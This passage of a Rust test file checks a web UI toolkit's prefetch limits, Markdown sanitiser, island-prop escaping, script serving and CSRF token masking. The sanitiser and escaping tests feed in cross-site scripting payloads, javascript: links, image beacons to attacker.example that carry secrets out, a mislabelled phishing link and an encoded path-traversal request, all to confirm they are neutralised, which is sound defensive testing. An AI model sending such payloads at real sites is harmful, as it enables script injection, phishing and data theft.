    assert!(html.contains("&quot;hide&quot;"), "{html}");
}

/// `Cmd::value` reaches only a hidden field the page opens to commands: a form's token
/// or method, or any other hidden field, stays as the server wrote it.
#[test]
fn a_hidden_field_says_when_a_command_may_set_it() {
    use navree_ui::{Input, InputKind};
    let html = render(
        &navree_ui::el("input")
            .attr("type", "hidden")
            .settable()
            .into(),
    );
    assert!(html.contains("data-ui-value"), "{html}");
    let html = render(&Input::new(InputKind::Hidden, "sort").settable().into());
    assert!(html.contains("data-ui-value"), "{html}");
    let html = render(&Input::new(InputKind::Hidden, "sort").into());
    assert!(!html.contains("data-ui-value"), "{html}");
    let html = render(&navree_ui::form::csrf_field("tok").into());
    assert!(!html.contains("data-ui-value"), "{html}");
}

/// A page asks for at most four links to be fetched as soon as it is quiet, with script
/// or without: the rest are fetched when the pointer rests on them.
#[tokio::test]
async fn a_page_fetches_at_most_four_links_with_no_hover() {
    use navree_ui::View;
    let links: Vec<navree_ui::Element> = (0..8)
        .map(|n| navree_ui::el("a").href(format!("/e{n}")).prefetch_eager())
        .collect();
    let response = View::new("t")
        .body(navree_ui::el("nav").child(links))
        .into_response();
    let body = navree_http::body::read_body(response.into_body(), 1 << 20)
        .await
        .unwrap();
    let html = String::from_utf8(body.to_vec()).unwrap();
    assert_eq!(
        html.matches(r#"data-ui-prefetch="eager""#).count(),
        4,
        "{html}"
    );
    assert!(
        html.contains(r#"<a href="/e3" data-ui-prefetch="eager">"#)
            && html.contains(r#"<a href="/e4" data-ui-prefetch>"#),
        "the first four, in the page's order: {html}"
    );
}

/// Markup the app wrote itself counts toward the four, in the page's order, whatever way
/// it spells the mark: a browser reads `&#101;ager` as `eager` and attribute names in any
/// case. Text, comments and a script's text that only look like the mark are left alone.
#[tokio::test]
async fn markup_the_app_wrote_asks_for_no_more_than_four_either() {
    use navree_ui::{Node, SafeHtml, View};
    let raw = SafeHtml::trusted(concat!(
        r#"<a href="/r1" data-ui-prefetch="eager">1</a>"#,
        r#"<!-- <a href="/c" data-ui-prefetch="eager"> -->"#,
        r#"<a href="/r2" DATA-UI-PREFETCH='eager'>2</a>"#,
        r#"<a href="/r3" data-ui-prefetch = eager>3</a>"#,
        r#"<p title='x"y'>text: data-ui-prefetch="eager"</p>"#,
        r#"<a href="/r4" data-ui-prefetch="&#101;ager">4</a>"#,
        r#"<textarea><a data-ui-prefetch="eager"></textarea>"#,
        r#"<a href="/r5" data-ui-prefetch="">5</a>"#,
    ));
    let response = View::new("t")
        .body(navree_ui::el("nav").child(vec![
            Node::from(navree_ui::el("a").href("/e0").prefetch_eager()),
            Node::from(raw),
            Node::from(navree_ui::el("a").href("/e9").prefetch_eager()),
        ]))
        .into_response();
    let body = navree_http::body::read_body(response.into_body(), 1 << 20)
        .await
        .unwrap();
    let html = String::from_utf8(body.to_vec()).unwrap();
    for kept in [
        r#"<a href="/e0" data-ui-prefetch="eager">"#,
        r#"<a href="/r1" data-ui-prefetch="eager">"#,
        r#"<a href="/r2" DATA-UI-PREFETCH='eager'>"#,
        r#"<a href="/r3" data-ui-prefetch = eager>"#,
    ] {
        assert!(
            html.contains(kept),
            "the first four stay eager: {kept} in {html}"
        );
    }
    for capped in [
        r#"<a href="/r4" data-ui-prefetch>"#,
        r#"<a href="/e9" data-ui-prefetch>"#,
    ] {
        assert!(
            html.contains(capped),
            "past four, on hover only: {capped} in {html}"
        );
    }
    for untouched in [
        r#"<!-- <a href="/c" data-ui-prefetch="eager"> -->"#,
        r#"<p title='x"y'>text: data-ui-prefetch="eager"</p>"#,
        r#"<textarea><a data-ui-prefetch="eager"></textarea>"#,
        r#"<a href="/r5" data-ui-prefetch="">"#,
    ] {
        assert!(
            html.contains(untouched),
            "not a mark, or no value: {untouched} in {html}"
        );
    }
}

// ---- Markdown ------------------------------------------------------------------------------
//
// Text from a model or a visitor is Markdown, and Markdown must not be a way
// to put markup, a script, a request to another site or a link to one into the page.

/// Every `href` value in `html`.
fn hrefs(html: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut rest = html;
    while let Some(at) = rest.find("href=\"") {
        rest = &rest[at + 6..];
        let end = rest.find('"').unwrap_or(rest.len());
        found.push(rest[..end].to_owned());
        rest = &rest[end..];
    }
    found
}

/// What no output of Markdown may hold, whatever the text said.
fn assert_markdown_is_inert(text: &str, html: &str) {
    let lower = html.to_ascii_lowercase();
    for bad in [
        "<script", "<iframe", "<object", "<embed", "<style", "<math", "<form", "<base", "<meta",
        "<link", "<video", "<audio", "srcdoc=", "style=",
    ] {
        assert!(!lower.contains(bad), "{bad} from {text:?}: {html}");
    }
    // The only pictures are the icons of the toolkit's own Copy buttons, one each.
    assert_eq!(
        lower.matches("<svg").count(),
        lower.matches("aria-label=\"copy code\"").count(),
        "<svg from {text:?}: {html}"
    );
    // No attribute that runs code: ` on` and a name, then `=`, outside text.
    for at in lower.match_indices(" on").map(|(at, _)| at) {
        let name: String = lower[at + 1..]
            .chars()
            .take_while(char::is_ascii_alphabetic)
            .collect();
        let after = &lower[at + 1 + name.len()..];
        assert!(
            !(name.len() > 2
                && after.starts_with('=')
                && html[..at].rfind('<') > html[..at].rfind('>')),
            "an event attribute from {text:?}: {html}"
        );
    }
    for href in hrefs(html) {
        let ok = [
            "http://", "https://", "mailto:", "tel:", "/", "#", "?", ".", "//",
        ]
        .iter()
        .any(|start| href.starts_with(start));
        assert!(ok, "href {href:?} from {text:?}: {html}");
        assert!(
            !href.to_ascii_lowercase().contains("javascript:"),
            "{href:?}"
        );
    }
}

#[test]
fn markdown_turns_no_hostile_text_into_markup() {
    let corpus = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=\"https://attacker.example\"></iframe>",
        "<style>body{display:none}</style>",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.example\">",
        "<base href=\"https://attacker.example/\">",
        "<a href=\"javascript:alert(1)\">x</a>",
        "<form action=\"https://attacker.example\"><input name=password></form>",
        "<!-- --><script>alert(1)</script>",
        "<![CDATA[<script>alert(1)</script>]]>",
        "<math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<a href=\"x\" onclick=\"alert(1)\">x</a>",
        "[x](javascript:alert(1))",
        "[x](JaVaScRiPt:alert(1))",
        "[x](&#x6A;avascript:alert(1))",
        "[x](  javascript:alert(1))",
        "[x](<javascript:alert(1)>)",
        "[x](data:text/html,<script>alert(1)</script>)",
        "[x](vbscript:msgbox(1))",
        "[x](file:///etc/passwd)",
        "[x][r]\n\n[r]: javascript:alert(1)",
        "<javascript:alert(1)>",
        "<https://attacker.example/steal>",
        "![x](https://attacker.example/steal?d=secret)",
        "![x][r]\n\n[r]: https://attacker.example/pixel.png",
        "![x](javascript:alert(1))",
        "![x](/internal/avatar.png?token=abc)",
        "[![x](https://attacker.example/a.png)](https://attacker.example)",
        "```\"><script>alert(1)</script>\ncode\n```",
        "```rust\n</code></pre><script>alert(1)</script>\n```",
        "| a |\n|---|\n| <script>alert(1)</script> |",
        "- [x] <img src=x onerror=alert(1)>",
        "# <script>alert(1)</script>",
        "> <img src=x onerror=alert(1)>",
        "\u{0}<script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</script>",
        "<<script>script>alert(1)<</script>/script>",
    ];
    for text in corpus {
        for markdown in [
            navree_ui::Markdown::new(text),
            navree_ui::Markdown::new(text)
                .links_in_new_tab()
                .copy_code(),
            navree_ui::Markdown::trusted(text),
        ] {
            assert_markdown_is_inert(text, &markdown.to_html());
        }
    }
}

#[test]
fn markdown_in_untrusted_text_draws_no_image_whatever_the_syntax() {
    for text in [
        "![x](https://attacker.example/steal?d=secret)",
        "![x][r]\n\n[r]: https://attacker.example/pixel.png",
        "![x](/internal/avatar.png?token=abc)",
        "![x](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)",
        "<img src=\"https://attacker.example/x.png\">",
        "[![x](https://attacker.example/a.png)](/safe)",
    ] {
        let html = navree_ui::Markdown::new(text).to_html();
        assert!(!html.contains("<img"), "{text:?}: {html}");
        // No `src` attribute; raw HTML shown as text reads `src=&quot;`.
        assert!(!html.contains("src=\""), "{text:?}: {html}");
    }
}

#[test]
fn a_link_that_says_one_site_and_goes_to_another_shows_where_it_goes() {
    let html = navree_ui::Markdown::new(
        "[https://yourbank.example/login](https://attacker.example/login)",
    )
    .to_html();
    assert!(html.contains(r#"data-host="attacker.example""#), "{html}");
    assert!(html.contains("nofollow"), "{html}");
    // The user name trick shows the host after the `@`.
    let html =
        navree_ui::Markdown::new("[x](https://yourbank.example@attacker.example/login)").to_html();
    assert!(html.contains(r#"data-host="attacker.example""#), "{html}");
}

#[test]
fn markdown_cannot_grow_without_a_bound() {
    // Past the limit the text is cut, so the work and the page stay in proportion to it.
    let big = "a *b* [c](/d) `e`\n\n".repeat(60_000);
    assert!(big.len() > navree_ui::markdown::MAX_BYTES);
    let html = navree_ui::Markdown::new(big).to_html();
    assert!(html.contains("markdown-cut"), "the cut is said");
    assert!(
        html.len() < navree_ui::markdown::MAX_BYTES * 6,
        "{}",
        html.len()
    );
    // Nesting is flattened, so the tree stays shallow, and the renderer writes all of it.
    let nested = format!("{}end", "> ".repeat(5000));
    let html = navree_ui::Markdown::new(nested).to_html();
    assert!(html.contains("end"));
    assert_eq!(
        html.matches("<blockquote>").count(),
        html.matches("</blockquote>").count()
    );
    let lists = format!("{}end", "- ".repeat(5000));
    let html = navree_ui::Markdown::new(lists).to_html();
    assert!(html.contains("end"));
}

#[test]
fn a_code_block_escapes_its_code_and_cannot_close_its_own_element() {
    let html =
        render(&navree_ui::CodeBlock::new("html", "</code></pre><script>alert(1)</script>").into());
    assert!(!html.contains("<script"), "{html}");
    assert_eq!(html.matches("<pre").count(), 1, "{html}");
    assert_eq!(html.matches("</pre>").count(), 1, "{html}");
}

/// An island's props are data in an attribute: whatever text they hold, it is escaped as
/// every attribute is, so it can't end the attribute, open a tag or start a script. The
/// address of the island's script is the app's own, never one taken from the props.
#[test]
fn an_islands_props_cannot_break_out_of_their_attribute() {
    use navree_ui::{Island, IslandScript};

    static MAP: IslandScript = IslandScript::new("map", b"export function mount() {}", 1024);
    let hostile = [
        "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "</div><script src=\"https://attacker.example/x.js\"></script>",
        "&quot; data-ui-island=\"https://attacker.example/x.js",
        "\u{2028}\u{2029}<!--",
    ];
    for text in hostile {
        let html = render(
            &Island::new("map", &MAP)
                .props(&serde_json::json!({ "city": text, "note": [text] }))
                .into(),
        );
        assert_eq!(
            html.matches('<').count(),
            4,
            "two tags opened and closed: {html}"
        );
        assert!(
            !html.contains("<script") && !html.contains("<img"),
            "{html}"
        );
        assert_eq!(html.matches("data-ui-island=\"").count(), 1, "{html}");
        assert!(
            html.contains(&format!("data-ui-island=\"{}\"", MAP.url())),
            "{html}"
        );
        let props = html
            .split("data-ui-props=\"")
            .nth(1)
            .and_then(|rest| rest.split('"').next())
            .expect("the props attribute");
        let read: serde_json::Value = serde_json::from_str(
            &props
                .replace("&quot;", "\"")
                .replace("&#39;", "'")
                .replace("&lt;", "<")
                .replace("&gt;", ">")
                .replace("&amp;", "&"),
        )
        .expect("the props read back as JSON");
        assert_eq!(read["city"], text, "the text comes back as it was");
    }
}

/// Only the app's own island scripts are served, by name, under the toolkit's mount.
#[tokio::test]
async fn only_the_apps_island_scripts_are_served() {
    use navree_ui::IslandScript;

    static CLOCK: IslandScript = IslandScript::new(
        "clock",
        b"export function mount(body) { body.textContent = '10:30 IST'; }",
        1024,
    );
    struct Islands;
    impl Module for Islands {
        fn register(&self, m: &mut ModuleBuilder) {
            m.contribute(CLOCK);
        }
    }
    let app = builder().module(UiModule).module(Islands).build().await;
    let ok = app
        .client()
        .get(&CLOCK.url())
        .send()
        .await
        .assert_status(200);
    assert_eq!(
        ok.header("content-type"),
        Some("text/javascript; charset=utf-8")
    );
    assert_eq!(
        ok.header("cache-control"),
        Some("public, max-age=31536000, immutable")
    );
    assert!(ok.text().contains("10:30 IST"));
    for path in [
        "/_navree/ui/island/map-000000000000.js",
        "/_navree/ui/island/clock.js",
    ] {
        app.client().get(path).send().await.assert_status(404);
    }
    // A way out of the mount is refused by the router before any file is looked up: a
    // path parameter that holds an encoded slash is a 400.
    let out = app
        .client()
        .get("/_navree/ui/island/..%2Fcore.js")
        .send()
        .await
        .assert_status(400);
    assert!(out.text().contains("Invalid URL"), "{}", out.text());
}

/// The session's token goes into a page masked afresh each time it is written: one form
/// drawn twice carries two strings, each of which holds the token, so a compressed page
/// says nothing of it. A value that is not a session token is written as it is.
#[test]
fn a_form_carries_the_sessions_token_masked_afresh() {
    use navree_http::csrf::unmask_token;

    let token = "Agra4Pune7Kota2Surat9Patna1Ranchi8Mysore";
    let carried = |html: &str| {
        let marker = r#"name="_csrf" value=""#;
        let start = html.find(marker).expect("a token field") + marker.len();
        let value = html[start..].split('"').next();
        value.unwrap_or_default().to_owned()
    };
    let form = || render(&FormView::<Login>::new().post("/login").csrf(token).into());
    let (first, second) = (carried(&form()), carried(&form()));
    assert_ne!(first, second);
    for value in [&first, &second] {
        assert!(!value.contains(token), "{value}");
        assert_eq!(unmask_token(value).as_deref(), Some(token));
    }
    let field = carried(&render(&navree_ui::form::csrf_field(token).into()));
    assert_eq!(unmask_token(&field).as_deref(), Some(token));
    let html = render(&navree_ui::form::csrf_field("tok").into());
    assert!(html.contains(r#"name="_csrf" value="tok""#), "{html}");
}
